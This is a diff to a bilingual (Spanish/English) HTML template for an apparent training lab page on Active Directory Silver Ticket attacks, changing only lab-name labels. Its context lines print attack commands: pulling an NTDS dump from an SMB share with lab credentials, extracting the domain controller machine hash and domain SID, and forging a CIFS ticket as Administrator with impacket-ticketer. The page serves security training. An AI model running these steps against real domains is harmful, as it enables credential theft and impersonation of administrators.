@@ -1,12 +1,12 @@
 {% extends "base.html" %}
-{% block title %}AD 12 – Silver Ticket – HackLabs{% endblock %}
+{% block title %}AD12 – Silver Ticket – HackLabs{% endblock %}
 {% block content %}
 <div class="p-6 max-w-3xl mx-auto">
   {% include '_lab_header.html' %}
 
   <div class="hl-card mb-4">
     <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
-    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_silver_ticket_obj_desc">Con el hash de la cuenta de máquina DC01$ (obtenido en el lab AD 10) puedes forjar un ticket de servicio CIFS válido sin hablar nunca con el KDC. Fabrica el Silver Ticket como Administrator y demuestra su validez descifrándolo con la misma clave.</p>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="ad_silver_ticket_obj_desc">Con el hash de la cuenta de máquina DC01$ (obtenido en el lab AD10) puedes forjar un ticket de servicio CIFS válido sin hablar nunca con el KDC. Fabrica el Silver Ticket como Administrator y demuestra su validez descifrándolo con la misma clave.</p>
     <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>verificación local del ticket forjado</code> <span data-i18n="ad_obj_flag_where">— captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.</span></p>
   </div>
 
@@ -19,7 +19,7 @@
 
   <div class="hl-card mb-4">
     <h2 class="font-semibold text-sm mb-3" data-i18n="ad_quickstart">Inicio rápido</h2>
-    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Forjar el ticket con el hash de DC01$ (del lab AD 10)
+    <pre class="text-xs font-mono whitespace-pre-wrap overflow-x-auto rounded-lg px-3 py-2.5" style="background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"># Forjar el ticket con el hash de DC01$ (del lab AD10)
 impacket-ticketer -nthash '&lt;hash_NT_DC01$&gt;' -domain-sid '&lt;DOMAIN_SID&gt;' \
   -domain {{ ad_realm_lower }} -spn 'cifs/{{ ad_dc_fqdn }}' Administrator
 
@@ -33,7 +33,7 @@ python3 verify_ticket.py Administrator.ccache '&lt;hash_NT_DC01$&gt;' Administra
     <h3>1 · Silver vs Golden</h3>
     <p>En Kerberos, el TGS (ticket de servicio) va cifrado con la clave de la cuenta que da el servicio. Si conoces esa clave — el hash de la cuenta de máquina <code>DC01$</code> para el servicio <code>cifs</code> — puedes <strong>forjar</strong> tú mismo un TGS válido para cualquier usuario. Es un <em>Silver Ticket</em>: acceso a <em>un</em> servicio concreto, sin pasar por el KDC (a diferencia del Golden Ticket, que usa el hash de krbtgt y abre todo el dominio).</p>
 
-    <h3>2 · Reunir los ingredientes (del lab AD 10)</h3>
+    <h3>2 · Reunir los ingredientes (del lab AD10)</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export DC_NT=$(grep '{{ ad_dc_host }}\$' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
@@ -95,7 +95,7 @@ Flag: HL{···}</pre>
     <h3>1 · Silver vs Golden</h3>
     <p>In Kerberos, the TGS (service ticket) is encrypted with the key of the account providing the service. If you know that key — the <code>DC01$</code> machine account hash for the <code>cifs</code> service — you can <strong>forge</strong> a valid TGS for any user yourself. That is a <em>Silver Ticket</em>: access to <em>one</em> specific service, bypassing the KDC (unlike the Golden Ticket, which uses the krbtgt hash and opens the whole domain).</p>
 
-    <h3>2 · Gather the ingredients (from lab AD 10)</h3>
+    <h3>2 · Gather the ingredients (from lab AD10)</h3>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export DC_NT=$(grep '{{ ad_dc_host }}\$' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
